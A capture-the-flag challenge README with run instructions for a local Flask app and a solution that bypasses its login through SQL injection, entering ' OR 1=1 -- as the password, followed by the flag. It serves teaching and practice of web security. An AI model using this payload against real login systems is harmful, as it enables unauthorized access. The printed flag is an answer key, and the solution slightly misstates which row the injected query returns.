# Sanremo Authentication
### 📄 Rules
In this challenge you `CANNOT` look at the `webapp` folder!

In order to get the points of this challenge, you need to provide a detailed description of the procedure that you used to get the flag.

Otherwise we account for the flag as read by the web application folder itself.

### ⚙ How to run the chall
Before running anything, you need to create the database. Follow these steps:
``` bash
$ cd webapp
$ python3 db_init.py
$ export FLASK_ENV=development
$ export FLASK_APP=app
```
And run the local server with:
```bash
$ flask run
```
You should see in the command output the link to the page
If you can't find it, it should be at: http://127.0.0.1:5000/

The descriprion of the challenge itself is on the webpage.



## 🔑 Solution 
As we can see from the webpage's tab, we can try with an SQL injection. 

We can put anything as `username`, and for the `password`:
```plaintext
' OR 1=1 --
```
So, if the query were something like this
```sql
SELECT id, username FROM users WHERE username='user' AND password='password'
```
the resulting query would be 
``` sql
SELECT id, username FROM users WHERE username='user' AND password='' OR 1=1 --
```
The `--` comments out everything that follows on the same line, making the query effective. Since 1=1 is always true, the condition `OR 1=1` will always return `TRUE`, and thus the query will return the user with the username `user` regardless of the password.

### 🚩 Flag
```plaintext
spritz{Bl4nc0_m4dness}
```